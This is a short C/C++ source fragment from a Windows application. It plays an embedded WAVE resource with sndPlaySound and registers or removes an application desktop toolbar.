bool PlayResource(const char *lpName)
{
    BOOL bRtn;
    LPSTR lpRes;
    HANDLE hRes;
    HRSRC hResInfo;
    HINSTANCE Nl=wxhInstance;

    /* Find the WAVE resource. */
    hResInfo= FindResource(Nl,lpName,"WAVE");
    if(hResInfo == NULL)
       return FALSE;
    /* Load the WAVE resource. */

    hRes = LoadResource(Nl,hResInfo);
    if (hRes == NULL)
      return FALSE;

    /* Lock the WAVE resource and play it. */
    lpRes=(LPSTR)LockResource(hRes);
    if(lpRes==NULL)
	{
	  FreeResource(hRes);
      return FALSE;
	}

    bRtn = sndPlaySound(lpRes, SND_MEMORY | SND_SYNC);
    if(bRtn == NULL)
	{
		FreeResource(hRes);
        return FALSE;
	}

    /* Free the WAVE resource and return success or failure. */
    FreeResource(hRes);
    return TRUE;
}

BOOL dspresenciaApp::PonBarra()
{
   RegisterAccessBar(hDlg,TRUE);
   {
      APPBARDATA abd; 
      abd.cbSize = sizeof(abd); 
      abd.hWnd = hDlg; 

	  AppBarPosChanged(&abd);
   }
   if (g_fAppRegistered)
   {
	   EnBarraTareas = 1;
   }
   return g_fAppRegistered;
}

BOOL dspresenciaApp::QuitaBarra()
{
	if (g_fAppRegistered)
	{
		RegisterAccessBar(hDlg,FALSE);
	}
	EnBarraTareas = 0;
	return g_fAppRegistered;
}
